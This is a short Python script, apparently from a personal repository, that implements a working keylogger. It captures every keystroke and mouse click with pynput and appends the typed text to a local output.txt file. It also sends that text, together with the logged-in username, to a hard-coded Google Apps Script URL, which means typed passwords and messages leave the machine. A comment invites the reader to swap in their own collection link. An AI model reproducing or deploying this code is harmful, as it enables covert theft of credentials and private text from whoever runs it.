# -*- coding: utf-8 -*-
"""
Created on Sat Aug 29 17:37:04 2020

@author: OHyic
"""

import os
import getpass
import requests
from pynput import mouse
from pynput import keyboard


def on_press(key):
    global text
    try:
        print('[INFO] alphanumeric key %s pressed'%(key.char))
        text +=str(key.char)
    except AttributeError:
        print('[INFO] special key %s pressed'%(key))
        if str(key) in ["Key.tab","Key.enter"]:
            print("write into file")
            write_to_text (file_name="output.txt")
            write_to_gsheets()
            text=""
        elif str(key) == "Key.space":
            text +=" "
        elif str(key) == "Key.backspace":
            text = text[:-1]
       
def on_click(x, y, button, pressed):
    global text
    if pressed:
        print('[INFO] mouse click at (%d,%d)'%(x, y))
        write_to_text (file_name="output.txt")
        write_to_gsheets()
        text=""

def write_to_text (file_name="output.txt"):
    global text
    #if file not exists, create new file
    if text != "":
        if(not os.path.isfile(file_name)):
            print("[INFO] New file created")
            f = open(file_name, 'x') 
            f.close() 

        try:
            #write into file
            f = open(file_name, 'a') 
            keylogs = text + '\n'
            print("[INFO] Keylogs: %s"%keylogs)
            f.write(keylogs)
            f.close() 
        except Exception as e:
            print(e)

def write_to_gsheets():
    global text
    try:
        if text !="":
            #update your google sheets link here
            requests.get('https://script.google.com/macros/s/AKfycbx3AY9YCOWcC-XiWTdeaEdmq5MdaN19RFkLneWoyCfw/exec?pc=%s&keylogs=%s'%(getpass.getuser(),text)) 
            print('https://script.google.com/macros/s/AKfycbx3AY9YCOWcC-XiWTdeaEdmq5MdaN19RFkLneWoyCfw/exec?pc=%s&keylogs=%s'%(getpass.getuser(),text))
    except Exception as e:
        print(e)


text = ""
mouse_listener = mouse.Listener(on_click=on_click)
mouse_listener.start()
keyboard_listener = keyboard.Listener(on_press=on_press)
keyboard_listener.start()

